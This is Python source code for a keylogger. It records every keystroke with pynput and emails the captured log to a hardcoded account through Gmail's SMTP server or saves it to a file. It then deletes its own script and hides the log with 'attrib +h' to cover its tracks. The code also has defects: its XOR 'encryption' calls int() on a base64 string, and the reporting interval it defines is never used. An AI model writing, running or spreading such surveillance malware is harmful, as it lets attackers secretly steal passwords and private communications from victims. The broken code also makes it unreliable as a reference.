import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard
import os
import getpass
import subprocess
import base64

SEND_REPORT_EVERY = 60  # saniye cinsinden, 60 1 dakika anlamÄ±na gelir
EMAIL_ADDRESS = "email@provider.tld"
EMAIL_PASSWORD = "password_here"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ""
        self.encrypt_key = self.generate_encrypt_key()

    def generate_encrypt_key(self):
        username = getpass.getuser()
        encrypt_key = base64.b64encode(username.encode()).decode()
        return encrypt_key

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += " " + str(key) + " "

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.report()
            return False

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_email(self):
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylog Report"
        encrypted_log = self.encrypt_log()
        msg.attach(MIMEText(encrypted_log, "plain"))

        with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        print("[+] Keylog report sent via email")

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"[+] Saved {self.filename}.txt")

    def encrypt_log(self):
        encrypted_log = ""
        for char in self.log:
            encrypted_char = chr(ord(char) ^ int(self.encrypt_key))
            encrypted_log += encrypted_char
        return encrypted_log

    def decrypt_log(self, encrypted_log):
        decrypted_log = ""
        for char in encrypted_log:
            decrypted_char = chr(ord(char) ^ int(self.encrypt_key))
            decrypted_log += decrypted_char
        return decrypted_log

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def report(self):
        self.end_dt = datetime.now()
        self.update_filename()

        if self.report_method == "email":
            self.report_to_email()
        elif self.report_method == "file":
            self.report_to_file()

        self.cleanup()

    def cleanup(self):
        os.remove(__file__)
        subprocess.call(["attrib", "+h", self.filename+".txt"])

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

